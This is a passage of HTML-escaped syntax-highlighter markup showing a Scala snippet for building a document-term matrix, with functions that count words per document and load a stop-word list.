&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;records&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;DTMRecord&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;DTMRecord&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordList&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;addDocumentToRecords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;documentName&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rank&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;documentContent&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Find a record for the document&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//找出一条文档记录&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;records&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;documentName&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;throw&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Document already exists in the records&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordRecords&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutable&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;individualWords&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;documentContent&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;individualWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordRecord&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordRecords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordRecord&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordRecords&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordRecord&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordRecords&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordList&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;wordList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;records&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;DTMRecord&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;documentName&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rank&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordRecords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;records&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-31&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getStopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/Users/.../stopwords.txt&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;latin1&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-34&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mkString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;n&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-35&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-36&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-37&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-38&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-39&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getNumericRepresentationForRecords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-40&quot;&gt;
